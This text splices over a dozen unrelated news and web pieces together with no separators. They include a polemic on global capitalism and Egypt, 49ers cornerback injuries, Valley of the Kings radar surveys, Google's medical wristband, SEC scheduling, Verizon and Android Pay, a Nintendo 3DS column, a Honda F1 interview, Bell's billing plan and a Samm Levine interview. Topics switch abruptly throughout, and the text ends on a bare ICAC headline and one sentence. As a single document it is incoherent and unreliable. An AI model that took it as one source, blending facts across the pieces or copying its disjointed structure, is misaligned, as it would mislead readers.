In “Les Misérables” Victor Hugo described war with the poor as one between the “egoists” and the “outcasts.” The egoists, Hugo wrote, had “the bemusement of prosperity, which blunts the sense, the fear of suffering which is some cases goes so far as to hate all sufferers, and unshakable complacency, the ego so inflated that is stifles the soul.” The outcasts, who were ignored until their persecution and deprivation morphed into violence, had “greed and envy, resentment at the happiness of others, the turmoil of the human element in search of personal fulfillment, hearts filled with fog, misery, needs, and fatalism, and simple, impure ignorance.”
The belief systems the oppressed embrace can be intolerant, but these belief systems are a response to the injustice, state violence and cruelty inflicted on them by the global elites. Our enemy is not radical Islam. It is global capitalism. It is a world where the wretched of the earth are forced to bow before the dictates of the marketplace, where children go hungry as global corporate elites siphon away the world's wealth and natural resources and where our troops and U.S.-backed militaries carry out massacres on city streets. Egypt offers a window into the coming dystopia. The wars of survival will mark the final stage of human habitation of the planet. And if you want to know what they will look like, visit any city morgue in Cairo.

It's a big week for the 49ers, coming off a season-opening victory and getting ready for their regular-season debut Sunday night at Levi's Stadium.
But as the 49ers start work toward beating the Chicago Bears in Game 2, San Francisco suddenly looks vulnerable to Chicago's passing game.
In the Bears' Game 1 loss to the Buffalo Bills, quarterback Jay Cutler threw for 349 yards and two touchdowns, and he spread the ball around. Four receivers – Brandon Marshall, Martellus Bennett, Alshon Jeffery and running back Matt Forte – combined for 29 catches. So, there's no doubt the Bears will put the ball up early and often.
The question is, who will the 49ers have playing cornerback Sunday night?
Starters Tramaine Brock (sprained toe) and Chris Culliver (concussion) both were lost in Game 1, and rookie Jimmie Ward – the No. 1 at nickel corner – also was lost during the victory over the Cowboys to concussion.
Veteran Perrish Cox and rookie Dontae Johnson filled in for Brock and Culliver against Dallas – playing most of the game – and the 49ers could also use veteran Chris Cook (acquired from the Vikings in the offseason) this Sunday night, as well. Cook was inactive for the Dallas game. Chance Casey, a second-year cornerback who was on Oakland's practice squad last season, also is available on the 49ers' practice squad.
It appears Brock is the most likely to return for Game 2. He was back on the sideline late in the game against Dallas, and could have played in an emergency. But Culliver and Ward will have to be cleared through the NFL's concussion protocol. By gametime, it could be a mix-and-match approach by defensive coordinator Vic Fangio to put together a secondary to cover the Bears receivers.
And Marshall and Jeffrey, in particular, are big, fast receivers capable of making game-busting plays. Last year the duo combined for 189 catches, 2,716 yards and 19 TDs.
If Culliver and Ward can't go, or if Brock's toe won't let him play effectively, the 49ers secondary will be severely challenged. Fangio said the injuries during the game against the Cowboys caused the 49ers to adjust.
“It affected the way we called the game, and it affected who was playing,” Fangio told reporters. “We had some packages up where we were going to play six DBs at a time, and obviously that got wiped out kind of early.”
After Sunday's game, Culliver posted on Twitter that, “I'm OK!! Thank u for the love!!” But it won't be up to him if he plays. Doctors will want to see progress this week in recovering from the concussion.
If he's out again, Fangio and the 49ers will have to do a juggling act.

LUXOR, EGYPT—New excavations and ground-penetrating radar studies in the Valley of the Kings suggest that multiple tombs have yet to be discovered. “The consensus is that there are probably several smaller tombs like the recently found KV63 and 64 yet to be found. But there is still the possibility of finding a royal tomb. The queens of the late Eighteenth Dynasty are missing, as are some pharaohs of the New Kingdom, such as Ramesses VIII,” said archaeologist Afifi Ghonim of the Ministry of State for Antiquities. The team, made up of Egyptian scientists and members of the Glen Dash Foundation for Archaeological Research, has collected so much data that it will take years to analyze it all. In particular, faults in the natural features of the Valley of the Kings can produce false positives in radar instruments. They have already identified a deep channel that the ancient Egyptians used for a short period as a flood control system to protect the tombs from water and debris.
If you live in New York and you set your apartment on fire in some ill-advised (read: don't set your apartment on fire) effort to collect on a suspiciously bloated insurance policy you took out on your second-hand furniture, a firewoman — spellcheck does not, by the way, recognize this apparently alien expression — probably won't be axing through your door to rescue you. Though, as of today, the odds that she will be been slightly better.
After the strong recruiting pitch it made to women this year, the FDNY reports that a whopping 3,481 members of the XX chromosome persuasion signed up for the firefighter entrance exam set for next week, up from 1,400 in 2007. Depending on their general test-taking aptitude, a small number of them could be joining the 24 uniformed female firefighters currently serving in the 11,000-member department. The more than 60,000 do-gooders who signed up for the test this year will be vying for the 300-325 available spots.
In completey unrelated news, a federal judge said Thursday that the city could owe $128 million to minorities after determining that the entrance exam discriminated against them. What? A predominately male organization that hangs out in tiny clubhouses discriminates against outsiders? It sounds a little — a lot — like the Little Rascals, right down to the black and white mottled dog.

One night, it seemed that the Jones family graveyard was disturbed, for several deceased family members returned to the house in ghostly form.
Nick Hoffmann and Bianca Jones were among the first to appear – the legacy founder's husband and daughter. Evelyn was surprised to see them having a conversation in her bedroom, but she tried not to attract their attention.
Callie's angry ghost went about the house, breaking things. No one dared ask what she was angry about, however.
Sadly, when Edith's 18th birthday came around, no one was there to celebrate with her, not even a ghost. Edith grew up a music lover, probably after years of listening to her father's music.
The Jones family story continues in Chapter 72. Or, if you've missed some chapters of the Jones family story, click here to catch up!

Google's latest device is aimed at letting doctors know how you're doing, even between checkups.
The company unveiled on Tuesday a new sensor-packed wristband, meant to collect information on vital signs for medical professionals. The device will measure pulse, heart rhythm and skin temperature, as well as things like light exposure and noise levels. Bloomberg earlier reported the news.
The device was developed by Google X, the search giant's experimental-research division. But unlike other smartwatches that are powered by Google's Android Wear software and also have health tracking features, the new device isn't targeted at consumers. Instead, the aim is for patients to wear the band during clinical trials and drug tests, so the data can be used by medical researchers and physicians. The idea is for doctors to get a complete picture of patients' activity as it relates to their health, even if they rarely come in for an examination.
"Our hope is that this technology could unlock a new class of continuous, medical-grade information that makes it easier to understand these patterns and manage serious health conditions," Andy Conrad, head of Google's life sciences team, said in a statement.
The move comes as Google has become increasingly ambitious about expanding its scope of products beyond its juggernaut search engine. Its search and advertising business is still the most dominant in the world, making more than $50 billion a year. But as the Internet evolves, CEO Larry Page has been looking to new categories and directions for the company. Google has made big bets on everything from smartphones to wearable devices to driverless cars.
Google said the device is still in a very experimental phase. The company is working with academic researchers and drugmakers to make sure the device and its sensors are actually accurate and helpful to medical professionals. Google said that process could take years, but once the device is ready, the company will work with partners to build and distribute the wristband to a larger audience.
It's the same approach Google has taken with development of its smart contact lens, another Google X product, which has sensors that measure glucose levels in tears for diabetes patients. Last July, Google announced it was partnering with the pharmaceutical giant Novartis to produce the contact lenses.
Google is also working on software to help clinicians securely store, analyze and interpret the data gathered from the device, a Google spokeswoman told CNET. The company is working with medical partners to refine the user interfaces of the software and the analytics that support the system, the spokesperson said.
The move may raise concern from privacy advocates who worry that Google already has access to too much of people's personal data. Google, which makes the bulk of its revenue on advertising, lives on knowing information about its users, including where they travel on a map or what they search for online.
But the company stressed it has teams in place to ensure privacy and security. Institutional review boards -- independent ethics committees that review medical research involving humans -- also have oversight of the project, a Google spokeswoman said.
Google also has other life science projects under way. In 2013, Google launched Calico, a company with the overarching goal of extending the human lifespan. The company is run by former Genentech CEO Arthur Levinson. Last September, Calico announced a partnership with the biopharmaceutical firm AbbVie to pour up to $1.5 billion into a research facility focused on fighting age-related diseases.
Google also announced a project last summer called the Baseline study, also led by Conrad, aimed at learning enough about the human body to be able to detect fatal diseases like cancer or heart disease earlier, so treatment is more preventative and not reactive. Google said the new wristband would be used to help further the study.
In 2013 the Starks attended the Red Wedding, Don Draper's emotional walls crumbled at the sight of a Hershey's bar, and the White family imploded. Those are just a handful of 2013's biggest life events according to television, a year that also saw The CW's Arrow improbably become a genuinely good series, Netflix strongarm the scripted programming game, and reimaginings of Sleepy Hollow and Hannibal debut, against all odds, as must-watch television.
Can 2014 keep up? Of course it can. As we say goodbye to Sons of Anarchy and begin the funeral arrangements for Mad Men, new seasons from all of 2013's best and brightest are due, (save Breaking Bad of course), as are the premieres of several shows that have the potential to become the new talk of Twitter. The debate of whether or not TV is in a golden age will have plenty of reasons to rage on.

Mike Slive and the SEC have preserved annual cross-division rivalries. (USATSI) More SEC: Sticking with 8-game schedule | Dodd: Scheduling genius
For years, LSU athletic director Joe Alleva has made clear where his football program stands on its annual cross-division rivalry with Florida: It's unfair, and he wants out.
Alleva didn't get his wish Sunday, as the SEC's decision to maintain its 6-1-1 scheduling format will force the Tigers to continue playing the Gators on a yearly basis. While acknowledging the importance of the preservation of Auburn's rivalry with Georgia and Alabama's with Tennessee, Alleva made no effort to hide his disapproval Sunday night.
"I'm disappointed in the fact that the leadership of our conference doesn't understand the competitive advantage permanent partners give to certain institutions," Alleva told the New Orleans Times-Picayune. "I tried to bring that up very strongly at the meeting today. In our league we share the money and expenses equally but we don't share our opponents equally."
Alleva said that the league could have allowed Auburn, Georgia, Alabama and Tennessee to keep their series while every other team rotated both cross-divisional games, but that proposal was also voted down by teams voting for their own "self-interest" over "competitive balance."
"If I'm Ole Miss and I'm playing Vanderbilt, I'll vote to play Vanderbilt," Alleva said. "If I'm Mississippi State and I'm playing Kentucky, I'm going to vote to play Kentucky."
As we wait to hear from Ross Bjork and Scott Stricklin over those comments, it's worth noting that Alleva is correct that the SEC's scheduling has been and will continue to be unbalanced; he points out that since 2000 LSU has played Florida and Georgia 19 times to Alabama's 8, and no, that's not entirely fair.
But for starters, the cyclical nature of college football means that SEC schedules are never going to be perfectly balanced. (Would LSU really have preferred Missouri or Tennessee to Florida last season?) There's the fact that with the college football playoff's ascension, one SEC loss will very rarely -- if ever -- be enough to cost an eventual SEC champion its national title hopes. And then there's this:
Result of Florida-LSU game has kept loser out of SEC title game 6 times (since 1992). Losses cost Florida 4 SECCG appearances, LSU only 2. — Thomas Goldkamp (@Goldkamp247) April 28, 2014
Let's take a moment and weigh up the costs of the Florida series for LSU -- 2 missed SEC title games in 21 years -- vs. the benefits of, say, this:
Alleva is well within his rights to advocate for the most frequent possible route to championships for his football program. But this is college football, and there's also something to be said for the most frequent possible route not always being the best one. The SEC's expansion to 14 teams, coupled with the decision to stay at an eight-game schedule, means that matchups between the league's cross-divisional heavyweights will be rarer than ever; Florida and Alabama will play just twice every 12 years, ditto LSU and Georgia, ditto Auburn and Tennessee. But the Tigers and Gators will still have the pleasure of one such marquee matchup every single season.
Is that worth a tougher road to Atlanta? Maybe, maybe not. (Though we'd say so.) But it's certainly worth something.
Verizon last week launched a promotion in support of Android Pay, offering subscribers free additional data when they use Google's payment service at the point of purchase. The move follows last month's news that Verizon is the only major carrier that doesn't allow Samsung to preload its own mobile payments offering on Verizon's phones.
Verizon was once behind Softcard, a carrier-backed mobile payments system that never gained any real traction and was swallowed up by Google in early 2015. Google launched Android Pay a few months later.
And while Verizon no longer appears to have a major stake in the space, it clearly has an interest in the success of Android Pay over rival systems, perhaps through a revenue-sharing deal with Google. Verizon representatives declined to discuss the carrier's strategy with Android Pay.
Like its fellow carriers, Verizon has something of a history of favoring certain apps, services and technologies over others, or even overtly blocking offerings at will. A 10-month-long FCC investigation a few years ago found that the operator had pressured Google to remove 11 apps from its app stores that enabled subscribers to use their smartphones as mobile Wi-Fi hotspots for other devices. (The case ended in a $1.25 million settlement and Verizon's agreement to permit such usage at no extra charge.)
Verizon also blocked Google Wallet when it was supporting Softcard, claiming to do so on dubious technical grounds. And the carrier was sued more than ten years ago after it disabled some Bluetooth capabilities on one Motorola model, claiming certain features conflicted with contractual agreements it had with content providers.
In fact, all the major U.S. carriers have blocked tethering apps in the past to some degree, essentially forcing users to pay extra to consume data via Wi-Fi on devices other than their phones. AT&T's terms of service today specifically forbid tethering unless users are on special plans.
AT&T also has blocked the use of video chat apps such as Apple's FaceTime and Google's Hangouts on its cellular network, before beginning to support them in 2013. The carrier had allowed subscribers to use video chat through Wi-Fi, however, indicating the policy was in place to ease congestion on its network.
Whether such blocking and favoring strategies have been successful is difficult to say. Increased data traffic from iPhone users was blamed for some of AT&T's network problems several years ago, and those woes might have been exacerbated had the carrier allowed video chat apps to further congest its network. Verizon gained nothing by blocking Google Wallet a few years ago -- Softcard went nowhere, obviously -- but the strategy surely didn't cost it many customers.
But T-Mobile stands as something of a contrast to those strategies, as its momentum over the last two years appears to stem in part from its willingness to support non-cellular technologies and third-party offerings rather than block them. Carriers generate no additional money from Wi-Fi calls, of course, but T-Mobile saw impressive uptake of its Wi-Fi calling feature it launched in 2007.
And T-Mobile doesn't directly monetize Binge On, which provides zero-rated video to subscribers, but the service has proven tremendously popular with subscribers and likely won the carrier more than a few customers. (Though T-Mobile does benefit from reduced video traffic on its network.) Binge On has become so compelling, in fact, that YouTube joined the program after initially complaining that T-Mobile was degrading the quality of all video for its users. Binge On might run afoul of net neutrality rules -- although it may not -- but it clearly is paying dividends for the carrier.
It's too early to predict whether Verizon will reap rewards through its Android Pay promotion that gives customers who use it up to 2 GB of data. And asking subscribers to download Samsung Pay rather than having it embedded isn't much of a burden. But as T-Mobile has demonstrated, there are upsides for carriers that help users do what they want on their phones. --Colin | @colin_gibbs
Two years ago, Nintendo was in trouble. The House of Mario had just released a brand-new handheld system with impressive 3D graphics, but nobody seemed to care. Sales were sluggish and reception wasn't great.
So they did something drastic: just six months after releasing the 3DS, Nintendo slashed the system's price from $250 to $170, shocking the gaming world. "Nintendo is screwed!" people would shout. "They'll never recover from this!"
Don't look now, but they've recovered. And everything has changed for the Nintendo 3DS.
Over the past two years, Nintendo's handheld has slowly morphed from national punchline to bona fide powerhouse. When it launched in March of 2011, the 3DS wasn't very compelling: sure, it was a pretty machine, but who wanted to pay $250 for a system that could play... what, Steel Diver? Two years later, buy the 3DS XL—an upgraded version of Nintendo's glasses-free 3D machine—and you can play some really good games in some really good series, from Kingdom Hearts to Super Mario to Professor Layton. And if you're feeling adventurous, you can hop onto the digital store and access a ton of weird, unorthodox, completely fascinating games, like Pushmo and Crimson Shroud.
The 3DS's library is getting stronger and stronger. Look at this morning's Nintendo Direct presentation. Today we saw announcements of a great-looking new Mario & Luigi, a new Mario Golf, a Donkey Kong Country Returns remake, and a whole bunch of crazy downloadable games for the eShop, which is growing more and more impressive every month.
Advertisement
These announcements were packaged with new details and info on already-announced games like Luigi's Mansion 2, Animal Crossing: New Leaf, and DLC for the excellent Fire Emblem: Awakening, which came out last week. Unless you only play first-person shooters, you'll probably find something appealing on Nintendo's glasses-free 3D machine.
And we haven't even gotten to the third-party stuff. The Atlus role-playing games Etrian Odyssey IV and Devil Summoner: Soul Hackers are both coming soon, as are new Castlevania and Monster Hunter games. (If Square Enix decides to listen to their fans and bring over the original RPG Bravely Default: Flying Fairy and the Dragon Quest VII remake, even better.)

Keep in mind, Nintendo hasn't even come out with brand-new original games in two of their biggest franchises: Zelda and Metroid. Major new 3DS games starring Link and Samus—which, as anyone who follows Nintendo knows, are inevitable—would continue keeping us attached to the pocket-sized system.
The best video game systems are, quite simply, the systems that have the best games. In 2013, that's the 3DS.

That's a lot of name-dropping, but the point is this: the 3DS is impressive, and continues to get more and more impressive as Nintendo does more and more to support it. While it's always fun to debate over console power and technical specs, the best video game systems are, quite simply, the systems that have the best games. In 2013, that's the 3DS.
As Stephen Totilo has pointed out, the 3DS is worth getting just for Fire Emblem: Awakening, a wonderful game that is essentially chess on crack. But the 3DS is also worth getting because of what else is on there—Super Mario 3D Land is one of the best Mario games Nintendo has ever made, Zero Escape: Virtue's Last Reward was my favorite game of 2012, and Revelations might be the only Resident Evil game worth a damn since number four.

Three or four years ago, the best game system on the market wasn't the Xbox or PlayStation: it was Nintendo's DS. Filled with puzzlers, platformers, RPGs, adventure games, and tons of series from tons of different genres, the DS was cheaper, more accessible, and more interesting to me than any other system you could buy. Games were $30-40, and developers seemed far more willing to experiment with crazy new ideas—like a Mario RPG in which you explore Bowser's stomach, or a visual novel that requires you to hold your system sideways to play. Over the past nine or ten years, I've bought more games for my DS than for any other system.
The 3DS has followed the same path, and now it's booming. Sales are great—Nintendo says they've moved 30 million of the little buggers worldwide—and the machine has exceeded our expectations by a great deal.
Advertisement
Maybe it was the near-death experience that did it. Back in the summer of 2011, when the 3DS was tanking and nobody thought it could keep up in a world of iPhones and Androids, Nintendo kept up the effort and kept fighting with their backs against the wall. They wisely decided to stop selling the 3DS as a 3D machine—a smart move, because people don't really care about 3D anymore—and instead reverted to the same approach that has worked for them for three decades now: making great games.
Seems simple, right? Gimmicks and specs are irrelevant: a system with great games is a great system. The 3DS has great games. And it's a great system.

Honda motorsport boss Yasuhisa Arai talks F1i through the engine manufacturer's hopes and plans for its second season with McLaren
Click here for Honda's reflections on 2015
How much progress can the power unit make this year? Gradual like last year or a big step?
“We have a few issues. One is reliability and another is deployment. The concept is fixed and now testing the MGU-H and turbo, but we need time to confirm the reliability at the same time. So we have three months [between 2015 and 2016] but we need more time to see how it goes.”
The current regulations do make it hard to improve so do you feel there is a limit to what you can achieve over the winter?
“So the token system is a good system to reduce the cost because the areas for development are limited. But if you have a big gap it is very difficult to catch up. But we discuss it with other suppliers and the FIA so next year we have the same token numbers. I think that's enough for everyone. So now it's not so difficult to change big items.”
If you were left to your own design, would you have gone with the ‘size zero' design or do you think there is more potential in a different power unit layout?
“Size zero was our layout finalised by talking with McLaren, but Honda produces many road cars and we have the motto: ‘Man maximum, machine minimum'. That is our basic philosophy, so we do that.”
Are you going to change the layout of the V to fit a bigger turbo?
“Not such a big change. Still a compact layout, but I know that we need a bigger size of turbocharger. So keeping the concept but changing the inside of the chamber or making any part smaller is a big target.”
Was the size the biggest problem of making the turbo efficient or were there other problems as well?
“The size led to the inefficiency. The size is small so the engine needed high pressure air. So that means the high rotation - 120,000rpm - is the limitation.”
Mercedes had a new fuel which helped improve performance when it updated its power unit in Monza. How closely are you working with Mobil1 to improve performance?
“Very closely. We discuss with Mobil1 directly. Of course it is one of the big partners but from the R&D side - our R&D and Mobil1's R&D - we have very big discussions. They made many kinds of fuels which we tested many times to realise what is the best way and the best solution. Day-by-day, every week, every month, we keep doing that.”
Is that an area where you still see potential for clear improvement?
“I think so. At the start of the fuel development it was a steep improvement curve, but now it's levelling off a bit. I assume that every other team may have similar issue. Fuel is now very sophisticated, however I'm sure that there is still room for improvement in the future. So we will to continue to make the effort because it is important to keep pushing fuel performance to improve horsepower”
You came in to F1 to win and challenge Mercedes, does it feel like it will take longer to get there than when you first came in?
“Honestly it is still far away but we should watch the opposition and always want to catch up. We will work so hard to do that.”
What are the realistic targets for next season from the position you are in now?
“We want to solve the ERS issues and also the reliability issues before Melbourne. That's technically. And as a team, very honestly, we want to enter in to Q3. That's being very honest.”
Do you feel it will be two years until you can talk about podiums and wins or will it be even longer?
“You know that before the winter tests [in 2015] I said some things about podiums and everyone said I had a big mouth! I hope we can get to the podium but I can't say right now when or what race. Everyone - not only me - hopes to be in a good position. So the first step is to get in to Q3, that's the first step.”
What encourages you for 2016?
“To compete with the other teams and encourage our fans and stakeholders. Inside the team our team wants to compete with the other teams.”

UPDATE: I spoke with Brennaman this morning about his comment accidentally going out across the airwaves. Brennaman said the comment was not aimed at a specific player on the Reds or Pirates but was about someone unrelated to the game broadcast who he and announcing partner Chris Welsh were talking about off the air earlier in the day. Brennaman also added, "I'm sorry that I used that kind of language on the air or off. It's not a good example to set for those watching, especially kids."
Reds announcer and Fox play by play man Thom Brennaman got caught with a hot mic Sunday afternoon with Cincy hosting the Pittsburgh Pirates. After Pirates pitcher Jeff Locke walked Reds SS Zack Cozart, you can hear Brennaman whisper "this guy sucks" into the microphone.
One would have to presume Brennaman is not talking about Cozart, but Locke. Perhaps that's a little harsh considering Locke was 8-2 this year with a 2.15 ERA entering the game and was selected as an All-Star. Aaaand he picked up the win today in a 3-2 Pirates victory…. so there's that. (As a few commenters and tweeters have pointed out, it's possible Brennaman could have been talking about Reds catcher Corky Miller, a recently promoted journeyman .185 career hitter who was batting after Cozart. So it definitely puts it up in the air who exactly Brennaman is talking about on the hot mic.)
Regardless, I'm all for taking the chains off broadcasters and hearing their true feelings on players instead of faux niceties all the time. Just imagine how much more entertainment we would all get in a world where baseball broadcasts could be turned into the EPL FanZone.

Yesterday was the deadline for parties to the CRTC's hearing into usage based billing to submit their comments. Bell stole the show by dropping its wholesale UBB proposal and substituting it with a new acronym – Aggregated Volume Pricing (AVP) – that should allow independent ISPs to retain some flexibility when it comes to their Internet service plans. The headlines rightly note that this is a significant backtrack for Bell. Just over two months ago, Bell wrote to the Commission to urge it to grant final approval to wholesale UBB, arguing “the implementation of the Companies' wholesale UBB has already been delayed for far too long.” Of course, that was before UBB became a political firestorm and Industry Minister Tony Clement made it clear he would not approve the Bell proposal as it then was.
Bell obviously saw the writing on the wall and has come back with a plan that allows independent ISPs to purchase 1 TB of data for $200 with an overage charge of 29.5 cents per GB. The aggregation of independent ISP subscriber traffic means that those ISPs can choose to offer whatever plans they like – unlimited, capped, or variations thereof – simply by purchasing aggregated data from Bell under the tariff. The aggregated pricing model was proposed by several people (even I figured it out in my first long UBB post on February 1st) and is certainly better than the wholesale UBB approach it replaces.
Notwithstanding the proposed improvement on wholesale terms, this represents only a small part of the broader UBB issue.
It only applies to the wholesale services as Bell's retail pricing remains unchanged. In other words, those cheering a 29.5 cent/GB overage charge should note that this is the wholesale price for the independent ISPs. The retail overage pricing, which can run as high as $5/GB, remains unchanged for now. In fact, all the concerns with retail UBB that affect the overwhelming majority of Canadian Internet users remains the same. As I argued in my piece on what to do next, addressing the wholesale issue is a necessary but not sufficient condition to dealing with the broader competition concerns in the Canadian market. Independent ISPs have functioned without wholesale UBB for years, yet have failed to make a serious dent in the dominance of the incumbent cable and DSL providers.
I will have more to say about what to do next in a paper and a series of posts coming out later this week. In the meantime, my primary takeaway from Bell's backtrack is to note how it affirms that there are two paths to keeping dominant market players from taking advantage of their position to the detriment of consumers and smaller businesses. The first is competition – with enough competition, dominant players become less dominant and are forced to respond with better pricing and services. The second – which arises in the absence of such competition – is regulatory or political pressure.
Bell's backtrack, which is entirely the result of political and public pressure (the independent ISPs were powerless and the regulator approved the wholesale UBB approach), is a reminder that Canada still does not have a sufficiently competitive environment to effect change. Instead, Canada still needs regulatory or political pressure to help foster a more competitive outcome. Relying on market forces may be the preferred approach, but at the present time there should be little doubt that market forces alone (particularly an artificially restricted market without foreign competitors) will not provide Canada with globally competitive Internet services and pricing.
In part two of my series from Connecticon, I spoke with the one and only Samm Levine. Many know him as lovable geek, Neal Schweiber, from one of the most beloved cult classics of all time, Freaks and Geeks. And it's not just in TV that he's made a name for himself. He's also been on the big screen, notably in Inglourious Basterds from Quentin Tarantino. And let's face it, if you're in a Quentin Tarantino film, it's because you have the chops. While in Hartford for the weekend, Samm and I chatted about Freaks and Geeks, The Aquabats, doing stand up at bar mitzvahs, attending cons, what he's up to this year and more.
Alex Obert: Being here at Connecticon, how many cons would you say you've done so far?
Samm Levine: I'm really new on the con scene, I think this is my third.
Alex Obert: So with those three, what are some crazy sights you've seen?
Samm Levine: That's a good question, but it's hard for me to answer that because everyone is so insanely dedicated to these costumes. Especially at this one right here in Hartford. At its core, it's an anime/cosplay convention, so everyone here has really gone all out. But I've done ones before where people aren't all dressed up and whatnot and craziest thing I've seen there are the dudes walking around wearing cock socks and capes. That also happens to be the name of my ska band.
Alex Obert: Who would you say is your favorite guest at Connecticon?
Samm Levine: My favorite guest at Connecticon is my good friend, Phil LaMarr. Phil has a body of work that spans so much on-camera and so much voice stuff. Everyone here knows him and loves him. Phil has had a line longer than George Takei's.
Alex Obert: What's your favorite role of his?
Samm Levine: I gotta go with Marvin in Pulp Fiction. He gets his head blown off!
Alex Obert: Do you two share Tarantino stories?
Samm Levine: We have talked Tarantino and it's between me and Phil. Those stories can't leave the room, they're deadly!
Alex Obert: So prior to working with Quentin Tarantino and even before Freaks and Geeks, you started off with doing standup comedy at bar mitzvahs. What was your material like?
Samm Levine: Bad. It was not good. Here's one of the only jokes that I really remember, it was something along the lines of “I'm growing up now, trying to be healthy. I want to be strong so I started lifting weights, but man, those things are heavy!”
Alex Obert: Oh, brother! That's definitely something. You have also been doing some heavy lifting with several Freaks and Geeks reunions including photoshoots, a panel, a magazine spread, and as of this year, an award ceremony. Throughout this exciting time, have you been taken back by anything fans have said to you or asked you at these appearances?
Samm Levine: It's hard to get taken back, no one's asked me a new Freaks and Geeks question in ten years. I do feel bad because everyone wants to know about reunions and stuff. We've done our versions of reunions. We just did the TV Land Awards a couple months ago. We did the Vanity Fair spread, which was amazing. Those interviews we all gave, we haven't spoken that intimately about our experiences on the show in over a decade. PaleyFest honored us a few years ago out in LA, that was a lot of fun. That's the closest you're really ever gonna get to a reunion. I try to tell people that and I know it lets them down a little, but hey, it's better than nothing.
Alex Obert: And I recall a reunion panel for the next Judd Apatow series, Undeclared. How did it feel to become a polar opposite of Neal Schweiber on that show?
Samm Levine: That was the best! It was one of the most fun guest roles I've ever done because it was the first time that I ever got to be the asshole. It helped me and Judd Apatow figure something out which is ultimately, I really only play one of two characters. I am either the nerd or the mean nerd. That cemented it.
Alex Obert: I wonder what it would have been like to have Jay Baruchel from Undeclared on Freaks and Geeks.
Samm Levine: Yeah, he would have been great. I'm sure they could have fit him in somewhere. But it's hard to say whether he would've been a freak or a geek because he's so cool in real life.
Alex Obert: I'd love to get your thoughts on your experiences with a couple of the actors that you worked with during that time. The first one is Tom Wilson.
Samm Levine: Ah, Tom Wilson! Coach Fredricks! He was great. I love Tom and of course I love Biff from Back to the Future. When we started shooting the show, I started hounding him with Back to the Future questions. And he's such a nice guy, he doesn't want to be rude or mean to me because I'm his co-star on the show. But at a certain point, sometime in November of 99, he actually said to me, “You know what Samm, I like you, you're a really nice guy. But here's the thing, we're coming up on fifteen years of Back to the Future talk for me, so I'm going to have to declare a moratorium starting on January 1, 2000. So if you've got any more Back to the Future questions, you gotta get them all in there before December 31st, 1999. After that, we're done.” So then I jammed all my hoverboard questions and Buford “Mad Dog” Tannen questions in there and he was a real mensch about it. I still love Tom.
Alex Obert: How about Dave Allen?
Samm Levine: Gruber Allen, man! That guy's the best. That guy makes everyone smile everywhere he goes. You'll never meet a happier, more jovial guy. And I got to work with Gruber again on a movie called Drones, which is a teeny little known movie directed by a fellow Connecticon guest, Amber Benson. Gruber's great, man. He's always at all of our reunion stuff and people go crazy for him. I don't blame them, he's the best.
Alex Obert: What's he been up to lately? I haven't heard much about him.
Samm Levine: He's been doing a lot of smaller stuff. He does a lot of stage stuff, he keeps busy with that. He's out in LA and I see him from time to time. He's doing great.
Alex Obert: And how about Joe Flaherty?
Samm Levine: Oh, boy do I love Joe! I miss Joe so much. Joe, for me, was my personal favorite person I got to work with on the show. I grew up a diehard SCTV fan. Getting to work with him is still one of my happiest memories. I don't get to see him as much anymore, he splits his time between LA and Toronto. He does a lot of teaching at the Second City theatre. Any time I get to see him though, it just makes me so happy.
Alex Obert: The show was also well-known for its selection of music that was featured. Which song do you felt fit a particular scene perfectly?
Samm Levine: I'm gonna say White Room by Cream in I'm With the Band. That's the episode that showcases the honesty of the band audition and the honesty of the kid being too embarrassed to shower in front of his buddies. I was the one who suggested to Judd and Paul that they should use White Room by Cream when we were shooting the episode. The song plays when Sam finally decides he wants to shower and he takes the long slo-mo walk through the locker room.
Alex Obert: On the topic of music, what might we find on your iPod?
Samm Levine: Always Zeppelin. Always The Who. Right now I've been listening to a lot of Mumford & Sons, they're fuckin' great, man.
Alex Obert: I sense a vibe that you're into big band music.
Samm Levine: I'm a big band man. I like my Benny Goodman. I like my Glenn Miller.
Alex Obert: What are some notable concerts you have attended?
Samm Levine: Weird Al Yankovic live at the Beacon Theatre on the Bad Hair Day Tour, 1996. I saw The Who at the Hollywood Bowl in July 2002. Also, Elton John live at the Bakersfield Centennial in 2003.
Alex Obert: How was your experience with The Aquabats?
Samm Levine: That was amazing. Those guys are so much fun. They're such big fans of Freaks and Geeks and I was a big fan of theirs. Just getting to play around and goof around with them, it was super fun. I love how many people have actually seen that show and will come up to me saying, “Hey, Pilgrim Boy! I watch you with my kids.” That's what I wanna hear!
Alex Obert: You recently got to interview TV's Danny Tamberelli. How'd that go?
Samm Levine: (laughs) I did, it was good. It was a live show that my friend Kerri Doherty and I did in LA for while called Geeking Out. We had Danny on the show and we actually go way, way back. We go back to the New York days, pre Freaks and Geeks, early nineties. It was cool to have him out on the show.
Alex Obert: If you were going to be on a vintage Nickelodeon show, which would you have wanted it to be?
Samm Levine: Probably Roundhouse.
Alex Obert: That's before my time.
Samm Levine: That's vintage, man! I mean I could've said You Can't Do That On Television.
Alex Obert: Definitely before my time, but I was born the year it came to an end. Here and now in 2015 though, you took part in the Big Slick celebrity softball game. How did that go?
Samm Levine: In Kansas City! Yeah man, that's my favorite weekend of the year. Rob Riggle, Eric Stonestreet, Paul Rudd, Jason Sudeikis and Dave Koechner, they're all Kansas City boys. Once a year, they get all their Hollywood buddies out to Kansas City to help raise money for Children's Mercy Hospital. It is the most noble because I know of and it is such a great organization. I have so much fun goofing off with those guys, playing a little softball, bowling, doing a big charity show and visiting the kids in the hospital. It's a super fun weekend.
Alex Obert: Before we wrap up, what do you have coming up for the rest of this year into next year?
Samm Levine: At the end of this month, Wet Hot American Summer: First Day of Camp on Netflix. I am reprising my voice role as Arty, the camp DJ. Check that out, all eight episodes are streaming on July 31st. The new season of Drunk History starts on Comedy Central in September, I have a pretty funny episode of that. I did a very funny episode of Children's Hospital recently, although it might not air until 2016. There are a couple independent features that I shot, but I don't know when they're gonna be out on any medium. But check my Twitter, I always tweet about that stuff.
Alex Obert: If someone reading this is about to watch something of yours for the first time, what should it be?
Samm Levine: If they haven't seen Freaks and Geeks, get on that! But if you know my stuff and you wanna find more, check out the movie I talked about before called Drones. It's hard to find because I don't think it's on any streaming services right now, but you can still buy a DVD of it on Amazon. I gotta tell you man, it is so worth it. It's a really great little movie that we shot for like no money. As far as no money movies go, it's a really good one.
Alex Obert: Excellent! I'd love to thank you so much for your time.
Samm Levine: My pleasure, Alex!

ICAC head Megan Latham says scathing report into Margaret Cunneen probe flawed, should be withdrawn
Updated
A report that criticised the ICAC investigation into Crown Prosecutor Margaret Cunneen was "fundamentally flawed", the head of the corruption watchdog has told a NSW parliamentary inquiry.
